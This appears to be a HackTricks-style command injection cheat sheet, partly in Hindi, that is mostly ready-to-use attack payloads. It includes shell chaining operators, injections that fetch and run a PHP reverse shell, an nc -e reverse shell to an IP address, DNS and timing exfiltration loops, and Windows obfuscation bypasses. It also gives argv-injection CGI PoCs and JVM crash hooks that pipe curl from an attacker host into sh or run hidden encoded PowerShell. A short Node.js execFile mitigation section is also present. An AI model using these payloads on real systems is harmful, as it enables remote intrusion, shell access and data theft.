# Command Injection

{{#include ../banners/hacktricks-training.md}}

## command Injection क्या है?

एक **command injection** हमलावर को उस सर्वर पर मनमाने ऑपरेटिंग सिस्टम कमांड्स चलाने की अनुमति देता है जो एप्लिकेशन को होस्ट कर रहा होता है। इसके परिणामस्वरूप, एप्लिकेशन और इसका सारा डेटा पूरी तरह से समझौता किया जा सकता है। इन कमांड्स के निष्पादन से आमतौर पर हमलावर को एप्लिकेशन के परिवेश और अंतर्निहित सिस्टम पर अनधिकृत पहुँच या नियंत्रण प्राप्त हो जाता है।

### संदर्भ

यह निर्भर करता है कि **आपका इनपुट कहाँ इंजेक्ट किया जा रहा है** — आपको कमांड्स से पहले **quote किए गए संदर्भ** (`"` या `'`) को समाप्त (terminate) करना पड़ सकता है।

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **सीमाएँ** Bypasses

यदि आप **arbitrary commands inside a linux machine** निष्पादित करने की कोशिश कर रहे हैं, तो आप इस **Bypasses:** के बारे में पढ़ने में रुचि रखेंगे।


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **उदाहरण**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### पैरामीटर

यहाँ शीर्ष 25 पैरामीटर दिए गए हैं जो code injection और समान RCE कमजोरियों के प्रति प्रवण हो सकते हैं (स्रोत: [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### समय-आधारित data exfiltration

डेटा निकालना: char by char
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS based data exfiltration

यह `https://github.com/HoLyVieR/dnsbin` से प्राप्त टूल पर आधारित है, जो dnsbin.zhack.ca पर भी होस्ट किया गया है।
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
DNS based data exfiltration की जाँच के लिए ऑनलाइन टूल्स:

- dnsbin.zhack.ca
- pingb.in

### Filtering bypass

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

जब आप JavaScript/TypeScript back-ends का ऑडिट कर रहे होते हैं, तो अक्सर आपको Node.js `child_process` API मिलती है।
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` एक **shell** (`/bin/sh -c`) शुरू करता है, इसलिए कोई भी ऐसा कैरेक्टर जिसका shell के लिए विशेष अर्थ होता है (back-ticks, `;`, `&&`, `|`, `$()`, …) जब user input स्ट्रिंग में concatenated किया जाता है तो **command injection** का परिणाम होगा।

**Mitigation:** `execFile()` का उपयोग करें (या `spawn()` बिना `shell` option के) और **प्रत्येक argument को अलग array element के रूप में** प्रदान करें ताकि कोई shell शामिल न हो:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Real-world case: *Synology Photos* ≤ 1.7.0-0794 एक unauthenticated WebSocket event के माध्यम से exploit योग्य था जिसने attacker controlled data को `id_user` में डाल दिया, जो बाद में `exec()` कॉल में embed हो गया और RCE प्राप्त हुआ (Pwn2Own Ireland 2024).

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

Not all injections require shell metacharacters. यदि एप्लिकेशन अविश्वसनीय स्ट्रिंग्स को system utility को arguments के रूप में पास करता है (भले ही `execve`/`execFile` के साथ और बिना shell), तो कई प्रोग्राम तब भी किसी भी argument को जो `-` या `--` से शुरू होता है, option के रूप में parse कर लेंगे। इससे एक attacker मोड बदल सकता है, output paths बदल सकता है, या dangerous behaviors ट्रिगर कर सकता है बिना कभी shell में प्रवेश किए।

Typical places where this appears:

- Embedded web UIs/CGI handlers जो कमांड बनाते हैं जैसे `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>`, आदि।
- Centralized CGI routers (e.g., `/cgi-bin/<something>.cgi` with a selector parameter like `topicurl=<handler>`) जहाँ कई handlers एक ही weak validator को reuse करते हैं।

What to try:

- Provide values that start with `-`/`--` ताकि downstream tool द्वारा flags के रूप में consume हो जाएँ।
- Abuse flags जो व्यवहार बदलते हैं या फ़ाइलें लिखते हैं, उदाहरण के लिए:
  - `ping`: `-f`/`-c 100000` device को stress करने के लिए (DoS)
  - `curl`: `-o /tmp/x` arbitrary paths पर लिखने के लिए, `-K <url>` attacker-controlled config लोड करने के लिए
  - `tcpdump`: `-G 1 -W 1 -z /path/script.sh` unsafe wrappers में post-rotate execution प्राप्त करने के लिए
- यदि प्रोग्राम `--` end-of-options को सपोर्ट करता है, तो उन naive mitigations को bypass करने की कोशिश करें जो गलत जगह पर `--` prepend करते हैं।

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
### JVM डायग्नोस्टिक कॉलबैक्स (गारंटीकृत exec)

कोई भी primitive जो आपको **inject JVM command-line arguments** (`_JAVA_OPTIONS`, launcher config files, `AdditionalJavaArguments` fields in desktop agents, आदि) करने देता है, वह application bytecode को छुए बिना एक विश्वसनीय RCE में बदला जा सकता है:

1. **निर्धारित क्रैश मजबूर करें** metaspace या heap को छोटा करके: `-XX:MaxMetaspaceSize=16m` (or a tiny `-Xmx`). यह प्रारंभिक bootstrap के दौरान भी `OutOfMemoryError` की गारंटी देता है।
2. **एक error hook जोड़ें**: `-XX:OnOutOfMemoryError="<cmd>"` or `-XX:OnError="<cmd>"` JVM abort होते ही किसी भी मनमाने OS कमांड को execute करता है।
3. वैकल्पिक रूप से `-XX:+CrashOnOutOfMemoryError` जोड़ें ताकि recovery प्रयासों से बचा जा सके और payload one-shot रहे।

Example payloads:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand <blob>"
-XX:MaxMetaspaceSize=12m -XX:OnOutOfMemoryError="/bin/sh -c 'curl -fsS https://attacker/p.sh | sh'"
```
क्योंकि ये diagnostics स्वयं JVM द्वारा पार्स किए जाते हैं, कोई shell metacharacters आवश्यक नहीं होते और कमांड launcher के समान integrity level पर चलता है। Desktop IPC बग जो user-supplied JVM flags को आगे बढ़ाते हैं (देखें [Localhost WebSocket abuse](websocket-attacks.md#localhost-websocket-abuse--browser-port-discovery)) इसलिए सीधे OS command execution में परिवर्तित हो जाते हैं।

## Brute-Force डिटेक्शन सूची


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}


## संदर्भ

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)

{{#include ../banners/hacktricks-training.md}}
